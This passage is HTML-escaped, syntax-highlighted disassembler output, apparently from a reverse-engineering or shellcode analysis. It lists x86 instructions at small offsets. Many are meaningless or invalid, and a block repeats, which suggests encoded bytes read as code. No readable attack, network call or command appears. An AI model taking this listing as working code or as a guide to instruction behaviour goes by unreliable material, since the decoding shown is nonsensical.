&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000065&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000066&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mf"&gt;626e0&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;bound&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;qword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi + 0xe&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000069&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;e0c9&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;loopne&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x34&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mh"&gt;0x0000006b&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="n"&gt;b1c8&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x38&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mh"&gt;0x0000006e&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c24b49&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x494b&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mh"&gt;0x00000071&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="n"&gt;cd03153c&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;adc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x3c1503cd&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000076&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000077&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="n"&gt;abe7c68fc8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;adc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ebx - 0x37703919&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x0000007d&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;82&lt;/span&gt;&lt;span class="n"&gt;f198&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x98&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000080&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;f1&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;int1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000081&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000082&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="n"&gt;d9&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bl&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000084&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ef&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="k"&gt;out&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000085&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;inc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000086&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cs&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000087&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;cc&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;int3&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000088&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;d38a8cc77cff&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ror&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx - 0x833874&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cl&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x0000008e&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x0000008f&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000090&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000091&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;es&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000092&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;b6ef&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x11&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000094&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c462df&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;les&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx - 0x21&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000097&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;fe&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;invalid&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000098&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x00000099&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;318&lt;/span&gt;&lt;span class="n"&gt;a9501a143&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx + 0x43a10195&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x0000009f&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;nop&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000a0&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000a1&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;es&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000a2&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;b6ef&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x11&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000a4&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c462df&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;les&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx - 0x21&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000a7&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;fe&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;invalid&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000a8&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000a9&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;318&lt;/span&gt;&lt;span class="n"&gt;a9501a143&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx + 0x43a10195&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000af&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;nop&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000b0&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000b1&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;es&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000b2&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;b6ef&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x11&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000b4&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c462df&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;les&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx - 0x21&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000b7&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;fe&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;invalid&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
